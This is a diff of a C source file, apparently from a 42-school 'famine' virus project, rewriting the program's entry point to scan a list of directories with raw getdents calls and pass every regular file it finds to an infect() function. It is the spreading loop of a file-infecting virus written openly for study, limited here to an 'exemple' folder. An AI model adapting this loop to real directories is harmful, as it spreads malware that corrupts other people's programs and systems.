@@ -6,53 +6,71 @@
 /*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/09/09 03:01:26 by nguiard           #+#    #+#             */
-/*   Updated: 2024/10/30 18:52:17 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/10/31 11:55:02 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
 
+#define BUFF_SIZE 0x1000
+
 void _start() {
 	int64_t		ret = 0;
 	uint64_t	fd;
-	uint64_t	dir_fd;
-	struct stat file_stat = {0};
-	str			file_name = "exemple/hello_world";
-	byte		*file_origin = NULL;
-	byte		buff[4096];
+	byte		buff[BUFF_SIZE];
+	str			directories[] = {"exemple", NULL};
+	char		max_path[513];
 	dirent		*d;
 
-	open(dir_fd, "/bin", O_RDONLY);	
+	for (int dir_index = 0; directories[dir_index]; dir_index++) {
+		size_t len_dir = ft_strlen(directories[dir_index]);
+		
+		for (size_t i = 0; i < len_dir; i++)
+			max_path[i] = directories[dir_index][i];
+		max_path[len_dir] = '/';
 
-	getdents(ret, dir_fd, buff, 4096);
-	while (ret > 0) {
-		int64_t	d_offset = 0;
-		while (d_offset < ret) {
-			d = (dirent *)((uint64_t)(buff) + d_offset);
-			printf("%s\n", d->d_name);
-			d_offset += d->d_reclen;
+		open(fd, directories[dir_index], O_RDONLY);	
+
+		getdents(ret, fd, buff, BUFF_SIZE);
+		if (ret < 0)
+			printf(FILE_LINE("gedents() \033[31mfail:\033[0m %ld\n"), ret);
+
+		while (ret > 0) {
+			int64_t	d_offset = 0;
+
+			while (d_offset < ret) {
+				byte	d_type;
+
+				d = (dirent *)((uint64_t)(buff) + d_offset);
+				d_type = buff[d_offset + d->d_reclen - 1];
+
+				if (d_type == DT_REG) {
+					size_t	file_size = ft_strlen(d->d_name);
+
+					for (size_t i = len_dir + 1; i < 513; i++)
+						max_path[i] = 0;
+					
+					for (size_t i = 0; i < file_size; i++)
+						max_path[len_dir + 1 + i] = d->d_name[i];
+
+					printf("[%s]\n", max_path);
+
+					infect(max_path);
+				}
+
+				d_offset += d->d_reclen;
+			}
+
+			getdents(ret, fd, buff, BUFF_SIZE);
+			if (ret < 0)
+				printf(FILE_LINE("gedents() \033[31mfail:\033[0m %ld\n"), ret);
 		}
-		getdents(ret, dir_fd, buff, 4096);
+
+		for (size_t i = 0; i < len_dir + 1; i++)
+			max_path[i] = 0;
 	}
-	
-	exit(0);
-	// ---
-	open(fd, file_name, O_RDWR);
 
-	printf("fd: %d\n", (int)fd);
-
-	fstat(ret, fd, &file_stat);
-	if (ret)
-		printf(FILE_LINE("fstat failed: %ld\n"), ret);
-
-	printf("Size of the file: 0x%lx\n", file_stat.st_size);
-
-	mmap(file_origin, NULL, file_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-	if (file_origin == MAP_FAILED)
-		printf(FILE_LINE("fstat failed: %p\n"), file_origin);
-
-	munmap(ret, file_origin, file_stat.st_size);
-	close(fd);
+	fflush(stdout);
 	
 	exit(0);
 }
